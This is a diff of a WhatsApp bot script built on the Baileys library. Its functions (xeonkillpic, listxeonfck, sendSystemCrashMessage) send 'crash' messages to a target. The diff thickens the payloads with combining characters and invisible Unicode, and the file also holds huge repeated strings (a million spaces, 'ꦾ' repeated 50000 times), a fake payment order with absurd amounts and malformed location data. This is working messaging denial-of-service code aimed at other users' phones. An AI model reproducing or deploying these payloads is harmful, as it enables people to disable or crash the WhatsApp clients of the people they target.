@@ -4,7 +4,7 @@
 //Instagram: unicorn_xeon13
 //Telegram: t.me/xeonbotinc
 //GitHub: @DGXeon
-//WhatsApp: +2348187637779
+//WhatsApp: +923253444558
 //want more free bot scripts? subscribe to my youtube channel: https://youtube.com/@DGXeon
 
 const { default: makeWASocket, fetchLatestBaileysVersion, downloadContentFromMessage, useMultiFileAuthState, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')
@@ -70,22 +70,22 @@ const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
         const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
         const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
          if(time2 < "23:59:00"){
-var xeonytimewisher = `This is S҉ t҉  i҉ n҉ g҉ e҉ r҉- V҉ 2҉. created by ᴇꜱ ᴛᴇᴀᴍꜱ-ᴛᴇᴄʜ👑. You are still awake by this time😫, you should get some rest🫠. Go and sleep naaaa, Anyways Good 🌃 Night o😅`
+var xeonytimewisher = ` you should get some rest🫠. Go and sleep naaaa, Anyways Good 🌃 Night o😅`
  }
  if(time2 < "19:00:00"){
-var xeonytimewisher = `This is S҉ t҉  i҉ n҉ g҉ e҉ r҉- V҉ 2҉. created by ᴇꜱ ᴛᴇᴀᴍꜱ-ᴛᴇᴄʜ👑. The day is almost drawing near, you should get some rest🫠. Anyways Good evening 🤭`
+var xeonytimewisher = ` Good evening 🤭`
  }
  if(time2 < "18:00:00"){
-var xeonytimewisher = `This is S҉ t҉  i҉ n҉ g҉ e҉ r҉- V҉ 2҉. created by ᴇꜱ ᴛᴇᴀᴍꜱ-ᴛᴇᴄʜ👑. The day is almost drawing near, you should get some rest🫠. Anyways Good evening 🤭`
+var xeonytimewisher = `👑 The day is almost drawing near, you should get some rest🫠. Anyways Good evening 🤭`
  }
  if(time2 < "15:00:00"){
-var xeonytimewisher = `This is S҉ t҉  i҉ n҉ g҉ e҉ r҉- V҉ 2҉ created by ᴇꜱ ᴛᴇᴀᴍꜱ-ᴛᴇᴄʜ👑. The weather is freaking hot😫😫😫😕, I wan die ooo Anyways Good afternoon 😞`
+var xeonytimewisher = `👑 The weather is freaking hot😫😫😫😕, I wan die ooo Anyways Good afternoon 😞`
  }
  if(time2 < "11:00:00"){
 var xeonytimewisher = `Good Morning 🌄`
  }
  if(time2 < "05:00:00"){
-var xeonytimewisher = `This is S҉ t҉  i҉ n҉ g҉ e҉ r҉- V҉ 2҉. created by ᴇꜱ ᴛᴇᴀᴍꜱ-ᴛᴇᴄʜ👑. Hope you slept well shaaa, anyways Good morning 🤭`
+var xeonytimewisher = `👑 Hope you slept well shaaa, anyways Good morning 🤭`
  } 
 module.exports = XeonBotInc = async (XeonBotInc, m, msg, chatUpdate, store) => {
     try {
@@ -203,7 +203,7 @@ remoteJid: "status@broadcast"
 "buttons": [
 {
 "name": "review_and_pay",
-"buttonParamsJson": `{\"currency\":\"INR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
+"buttonParamsJson": `{\"currency\":\"INR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🦄드림 가이 🦄드림 가이 🦄드림 가이\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
 }
 ]
 }
@@ -245,7 +245,7 @@ remoteJid: "status@broadcast"
 },
 message: {
 listResponseMessage: {
-title: `🦄드림 가이 Xeon`
+title: `드𓄂͜͡ঔৣ͜͡҉҉҉𓆩𝐇͜͡𝚲𝙓𝞝𝙍⁰⁹⁹⁨⁨𓆪࿐ꥈ‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲림 가이`
 }
 }
 }
@@ -277,7 +277,7 @@ message: {
   "liveLocationMessage": {
     "degreesLatitude": "p",
     "degreesLongitude": "p",
-    "caption": `🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon`+"ꦾ".repeat(50000),
+    "caption": `𓄂͜͡ঔৣ͜͡҉҉҉𓆩𝐇͜͡𝚲𝙓𝞝𝙍⁰⁹⁹⁨⁨𓆪࿐ꥈ‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲드림 가이`+"ꦾ".repeat(50000),
     "sequenceNumber": "0",
     "jpegThumbnail": ""
      }
@@ -291,15 +291,15 @@ async function xeonkillpic(target, kuwoted) {
  var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
     interactiveMessage: {
       header: {
-        title: "🦄드림 가이 Xeon",
+        title: "드𓄂͜͡ঔৣ͜͡҉҉҉𓆩𝐇͜͡𝚲𝙓𝞝𝙍⁰⁹⁹⁨⁨𓆪࿐ꥈ‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲",
         hasMediaAttachment: true,
-        ...(await prepareWAMessageMedia({ image: { url: "https://i.ibb.co/Wppj16p/cheemspic.jpg" } }, { upload: XeonBotInc.waUploadToServer }))
+        ...(await prepareWAMessageMedia({ image: { url: "https://i.ibb.co/qF53V71/image.jpg" } }, { upload: XeonBotInc.waUploadToServer }))
       },
       body: {
         text: ""
       },
       footer: {
-        text: "›          #🦄드림 가이 Xeon"
+        text: "›          #드𓄂͜͡ঔৣ͜͡҉҉҉𓆩𝐇͜͡𝚲𝙓𝞝𝙍⁰⁹⁹⁨⁨𓆪࿐ꥈ‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲"
       },
       nativeFlowMessage: {
         messageParamsJson: " ".repeat(1000000)
@@ -316,9 +316,9 @@ await XeonBotInc.relayMessage(target, {"paymentInviteMessage": {serviceType: "FB
 async function listxeonfck(target, kuwoted) {
  var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
   'listMessage': {
-    'title': "🦄드림 가이 Xeon"+" ".repeat(920000),
-        'footerText': `🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon`,
-        'description': `🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon`,
+    'title': "🦄드림𓄂͜͡ঔৣ͜͡҉҉҉𓆩𝐇͜͡𝚲𝙓𝞝𝙍⁰⁹⁹⁨⁨𓆪࿐ꥈ‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲"+" ".repeat(920000),
+        'footerText': `🦄드림𓄂͜͡ঔৣ͜͡҉҉҉𓆩𝐇͜͡𝚲𝙓𝞝𝙍⁰⁹⁹⁨⁨𓆪࿐ꥈ‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 🦄드림𓄂͜͡ঔৣ͜͡҉҉҉𓆩𝐇͜͡𝚲𝙓𝞝𝙍⁰⁹⁹⁨⁨𓆪࿐ꥈ‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 🦄드림𓄂͜͡ঔৣ͜͡҉҉҉𓆩𝐇͜͡𝚲𝙓𝞝𝙍⁰⁹⁹⁨⁨𓆪࿐ꥈ‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 🦄드림𓄂͜͡ঔৣ͜͡҉҉҉𓆩𝐇͜͡𝚲𝙓𝞝𝙍⁰⁹⁹⁨⁨𓆪࿐ꥈ‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 🦄드림𓄂͜͡ঔৣ͜͡҉҉҉𓆩𝐇͜͡𝚲𝙓𝞝𝙍⁰⁹⁹⁨⁨𓆪࿐ꥈ‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 🦄드림𓄂͜͡ঔৣ͜͡҉҉҉𓆩𝐇͜͡𝚲𝙓𝞝𝙍⁰⁹⁹⁨⁨𓆪࿐ꥈ‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 🦄드림𓄂͜͡ঔৣ͜͡҉҉҉𓆩𝐇͜͡𝚲𝙓𝞝𝙍⁰⁹⁹⁨⁨𓆪࿐ꥈ‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲`,
+        'description': `🦄드림𓄂͜͡ঔৣ͜͡҉҉҉𓆩𝐇͜͡𝚲𝙓𝞝𝙍⁰⁹⁹⁨⁨𓆪࿐ꥈ‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 🦄드림𓄂͜͡ঔৣ͜͡҉҉҉𓆩𝐇͜͡𝚲𝙓𝞝𝙍⁰⁹⁹⁨⁨𓆪࿐ꥈ‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 🦄드림𓄂͜͡ঔৣ͜͡҉҉҉𓆩𝐇͜͡𝚲𝙓𝞝𝙍⁰⁹⁹⁨⁨𓆪࿐ꥈ‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 🦄드림𓄂͜͡ঔৣ͜͡҉҉҉𓆩𝐇͜͡𝚲𝙓𝞝𝙍⁰⁹⁹⁨⁨𓆪࿐ꥈ‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 🦄드림𓄂͜͡ঔৣ͜͡҉҉҉𓆩𝐇͜͡𝚲𝙓𝞝𝙍⁰⁹⁹⁨⁨𓆪࿐ꥈ‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 🦄드림𓄂͜͡ঔৣ͜͡҉҉҉𓆩𝐇͜͡𝚲𝙓𝞝𝙍⁰⁹⁹⁨⁨𓆪࿐ꥈ‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 🦄드림𓄂͜͡ঔৣ͜͡҉҉҉𓆩𝐇͜͡𝚲𝙓𝞝𝙍⁰⁹⁹⁨⁨𓆪࿐ꥈ‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲`,
         'buttonText': null,
         'listType': 2,
         'productListInfo': {
@@ -428,7 +428,7 @@ async function sendSystemCrashMessage(jid) {
             'subtitle': " "
           },
           'body': {
